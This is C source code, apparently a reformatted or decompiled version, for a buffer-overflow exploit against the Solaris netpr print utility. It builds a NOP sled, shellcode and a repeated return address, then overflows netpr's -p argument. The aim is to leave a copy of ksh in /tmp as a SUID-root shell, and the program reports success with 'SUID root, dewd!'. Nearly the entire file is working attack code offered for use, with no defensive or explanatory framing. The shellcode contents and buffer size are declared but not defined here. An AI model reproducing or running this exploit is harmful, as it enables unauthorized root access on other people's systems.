#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {scalar_t__ st_uid; int st_mode; } ;

/* Variables and functions */
 int BUFLEN ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  O_RDWR ; 
 int STDERR_FILENO ; 
 int STDIN_FILENO ; 
 int STDOUT_FILENO ; 
 int WEXITSTATUS (int) ; 
 int /*<<< orphan*/  WIFEXITED (int) ; 
 int /*<<< orphan*/  WIFSIGNALED (int) ; 
 int WTERMSIG (int) ; 
 int /*<<< orphan*/ * buf ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  dup2 (int,int) ; 
 int /*<<< orphan*/  execl (char*,char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 int fork () ; 
 unsigned long get_esp () ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,int /*<<< orphan*/ ,unsigned long) ; 
 int /*<<< orphan*/  memset (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 int open (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ pipe (int*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  read (int,char*,int) ; 
 int /*<<< orphan*/  shell ; 
 scalar_t__ stat (char*,struct stat*) ; 
 unsigned long strlen (int /*<<< orphan*/ ) ; 
 long strtol (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 unsigned long strtoul (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  wait (int*) ; 
 int write (int,char*,int) ; 

int
main(int argc, char *argv[])
{
    unsigned long int esp, nop;                                           
    long int offset = 0;                         
    char *hostname, c;                           
    int i, null, umbilical[2];                   
    struct stat st;
    int status;                                                           

    if (argc < 2) {                                                       
        printf("usage: %s hostname [offset]\n", argv[0]);                 
        exit(1);
    }

    esp = get_esp();
    hostname = argv[1];
    if (argc > 2)
        offset = strtol(argv[2], NULL, 0);       
    if (argc > 3)
        nop = strtoul(argv[3], NULL, 0);
    else
        nop = 942;
 
    memset(buf, NOP, BUFLEN);                                             
    memcpy(buf+nop, shell, strlen(shell));       
    for (i = nop+strlen(shell); i <= BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;         
    
    printf("using return address 0x%08x (0x%08x offset %d) [nop %d]\n",   
           esp+offset, esp, offset, nop);
    
    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; copy /bin/ksh to /tmp first!\n");
        exit(1);
    }
    
    if (pipe(umbilical) < 0) {
        printf("exploit failed; unable to create a pipe!\n");
        exit(1); 
    }
        
    switch (fork()) {
    case -1:
        printf("exploit failed; unable to fork!\n");
        exit(1);
        break;
    case 0:
        if ((null = open("/dev/null", O_RDWR, 0)) < 0) {
            printf("exploit failed; cannot open /dev/null!\n");
            exit(1);
        }  
        dup2(null, STDIN_FILENO);
        dup2(null, STDOUT_FILENO);  
        dup2(null, STDERR_FILENO);
        if (null > STDERR_FILENO)
            close(null);
        close(umbilical[0]);
        dup2(umbilical[1], 10); /* yes, descriptor 10 -- trust me ;-) */
        execl("/usr/lib/lp/bin/netpr", 
              "netpr",
              "-I", "ADM-ADM",
              "-U", "ADM!ADM",
              "-p", buf,
              "-d", hostname,
              "-P", "bsd",
              "/etc/passwd", NULL);
        printf("exploit failed; unable to exec!\n");
        exit(1);
        break;
    default:
        close(umbilical[1]);
        c = 0;
        while (c != '\n') {
            read(umbilical[0], &c, 1);
        }
        c = '\0';
        while (write(umbilical[0], &c, 1) < 1)
            ;
        wait(&status);
        if (WIFSIGNALED(status)) {
            printf("exploit failed; child process died on signal %d "
                   "(try adjusting the offset)\n", WTERMSIG(status));
            exit(1);
        } else if (WIFEXITED(status) && (WEXITSTATUS(status) != 0)) {
            printf("exploit failed; child process exited with unexpected "
                   "return value %d, instead of 0\n", WEXITSTATUS(status));
            exit(1);
        }
        break;  
    }   
    
    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; /tmp/ksh disappeared somehow!\n");
        exit(1); 
    } else if (st.st_uid != 0) {
        printf("exploit failed; failed to make /tmp/ksh owned by root!\n");
        exit(1); 
    } else if ((st.st_mode & 07777) != 04555) {
        printf("exploit failed; failed to change /tmp/ksh to mode 4555!\n");
        exit(1);
    } else {
        printf("exploit successful; /tmp/ksh is now SUID root, dewd!\n");
        exit(0);   
    }       
}